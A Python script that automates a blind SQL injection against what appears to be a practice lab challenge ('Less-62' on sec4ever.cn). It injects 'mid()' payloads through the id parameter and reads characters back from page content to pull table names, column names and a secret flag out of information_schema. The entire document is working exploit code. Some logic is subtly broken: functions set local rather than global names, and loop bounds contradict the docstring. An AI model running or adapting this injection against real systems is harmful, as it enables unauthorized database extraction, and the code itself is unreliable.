# coding=utf-8
import requests
import string
from urllib import parse
from urllib import request

# mysql> select ascii('1'), (select substring(ascii('1'),1,1)), (select substring(ascii('1'),2,1));
# +------------+------------------------------------+------------------------------------+
# | ascii('1') | (select substring(ascii('1'),1,1)) | (select substring(ascii('1'),2,1)) |
# +------------+------------------------------------+------------------------------------+
# |         49 | 4                                  | 9                                  |
# +------------+------------------------------------+------------------------------------+

def str_to_hex(s):
    '''
    :param s:
    :return: 将字符串转为0x带头的十六进制值
    '''
    return '0x'+''.join([hex(ord(c)).replace('0x', '') for c in s])

# initialize param
url = "https://sec4ever.cn/Less-62/index.php?id=0') "
reset_url ="https://sec4ever.cn/sql-connections/setup-db-challenge.php?id={}".format(url.split("sec4ever.cn")[1])   # /sql-connections/setup-db-challenge.php?id=/Less-60/index.php

TIMEOUT = 8
VERIFY = True
charIndexSet =  ["Dumb","Angelina","Dummy","secure","stupid","superman","batman","admin","admin1","admin2","admin3","dhakkan","admin4"]   # 字符串特征,index is from 0-9
Set =  [1, 2, 3]   # 取字符串ascii值的十位和个位

# 初始化
table_name = ''
table_name_len = len('P79FGLN0JK')
column_name = ''
column_name_len = len('secret_9BN9')
flag_len = len('uwpeCvsrLcadsa8P7wSn9Ix4')
sess = requests.session()

def req2getOneChar(xurl, payload, start, end):
    '''
    :param xurl:
    :param payload: (select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573)
    :param start ,end: [start, end)
    :return:
    '''

    asciiValue = ['0', '0','0']
    flag = ""
    for l in range(start, end+1):
        for k, kv in enumerate(Set):
            # k = 0,1
            # kv = 1,2 用于substring得到十位 个位
            # "https://sec4ever.cn/Less-62/index.php?id=0') " + "or id=" + "mid(mid(({payload}), {l}, 1), {kv}, 1)"
            url = xurl + "or id=" + "mid(mid(({payload}), {l}, 1), {kv}, 1)".format(payload=payload, l=l, kv=kv) + '-- -'
            print(url)
            resp = sess.get(url=url, timeout=TIMEOUT, verify=VERIFY)
            for i in range(10):# 遍历0~9的特征值
                s1 = 'Your Login name : ' + charIndexSet[i]# "Dumb"
                e1 = 'Your Password : ' + charIndexSet[len(charIndexSet)-i-1]#admin4
                if( resp.text.count(s1) > 0  and resp.text.count(e1) > 0):
                    # 若页面内容中含有当前特征值，则认为当前特征值的索引是其对应位的值（0～9）
                    # 如：页面同时含有Angelina和dhakkan，该位值为1
                    asciiValue[k] = str(i+1)
                    break
                else:
                    asciiValue[k] = '0'
                    continue

        foo = int(asciiValue[0]+asciiValue[1]+asciiValue[2])# 如'4'+'9' => 49,
        flag += chr(foo)    #chr(49)='1'
        print("[+]current content is:{}".format(flag))
    if flag != '':
        return flag
    else:
        print("[!]req2getOneChar ERROR!")


# step 1：获取表名
def getTables():
    # Your Password:P79FGLN0JK
    payload = '''(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573)'''
    table_name = req2getOneChar(xurl=url, payload=payload, start=1, end=table_name_len)
    print("[-]table_name is:{}".format(table_name))


def getColumn():
    # step 2：获取列名
    payload = '''(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name={table})'''.format(table=str_to_hex(table_name))
    column_name = req2getOneChar(xurl=url, payload=payload, start=8, end=column_name_len)
    print("[-]clomun_name is:{}".format(column_name))

    if "secret" in column_name:
        print("[+]column_name is:{}".format(column_name))
    else:
        print("step2 失败！")

# step 3 获取flag
sess.get(url=reset_url, verify=VERIFY)
getTables()
getColumn()
payload = '''(select {} from {})'''.format(str_to_hex(column_name), str_to_hex(table_name))
flag = req2getOneChar(xurl=url, payload=payload, start=1, end=flag_len)
print("[+]FLAG is:{}".format(flag))